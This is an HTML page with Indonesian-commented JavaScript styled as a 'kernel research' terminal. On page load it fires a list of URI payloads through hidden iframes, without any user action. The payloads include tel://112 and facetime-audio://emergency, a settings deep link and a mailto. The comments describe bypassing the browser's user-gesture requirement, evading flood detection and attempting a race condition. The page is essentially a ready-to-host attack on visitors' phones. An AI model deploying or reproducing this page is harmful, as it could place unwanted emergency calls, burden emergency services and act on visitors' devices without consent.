<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>RESERVED - KERNEL RESEARCH GATEWAY</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .log { margin-bottom: 5px; border-bottom: 1px solid #111; }
        .danger { color: #ff3b30; }
        .blink { animation: blinker 0.6s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div id="terminal">
        <div class="danger blink">> [CRITICAL] INITIALIZING AUTO-DISPATCH...</div>
    </div>

<script>
const terminal = document.getElementById('terminal');
const log = (msg) => {
    const div = document.createElement('div');
    div.className = 'log';
    div.innerHTML = `> ${msg}`;
    terminal.appendChild(div);
};

/**
 * Teknik: Iframe Sink (Shadow Dispatch)
 * Mencoba memasukkan URI ke dalam frame tersembunyi untuk memicu dialog sistem
 * tanpa harus mengubah URL halaman utama (window.location).
 */
function shadowDispatch(uri) {
    const ifr = document.createElement('iframe');
    ifr.src = uri;
    ifr.style.display = 'none';
    document.body.appendChild(ifr);
    
    // Hapus frame setelah dipicu untuk membersihkan memory
    setTimeout(() => document.body.removeChild(ifr), 2000);
}

const payloads = [
    "tel://112",
    "mailto:research@kernel.gate?subject=AutoDispatch",
    "xxdhfy://",
    "prefs:root=WIFI",
    "facetime-audio://emergency"
];

// Eksekusi Otomatis saat Window Load
window.onload = async () => {
    log("Memory Check: <span style='color:white'>A18/A19 ARM64E</span>");
    log("Bypassing User Gesture Requirement via Iframe Sink...");

    for (let i = 0; i < payloads.length; i++) {
        // Jeda sangat singkat untuk mencoba mengecoh pendeteksi flood browser
        await new Promise(r => setTimeout(r, 200)); 
        
        log(`Injecting Payload [${i}]: <span class='danger'>${payloads[i]}</span>`);
        
        // Eksekusi Double-Tap (Mencoba memicu race condition)
        shadowDispatch(payloads[i]);
        
        // Fallback: Beberapa browser lama merespon window.location di dalam loop
        if(i === 2) {
            log("Attempting Window Location Fallback...");
            window.location.href = payloads[i];
        }
    }
    
    log("<br><span class='danger blink'>[!] AUTO-DISPATCH COMPLETED.</span>");
};
</script>
</body>
</html>
